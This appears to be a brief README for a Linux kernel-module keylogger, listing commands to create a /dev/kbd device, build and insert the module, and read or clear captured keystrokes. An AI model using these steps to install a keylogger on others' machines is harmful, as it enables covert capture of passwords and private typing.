
# keylogger

## how to use
create the /dev/kbd character device driver:
mknod /dev/kbd c 42 0
compile:
make
insert module:
sudo insmod kdb.ko
to see the keyboard log:
cat /dev/kbd
to clear the log:
echo "clear" > /dev/kbd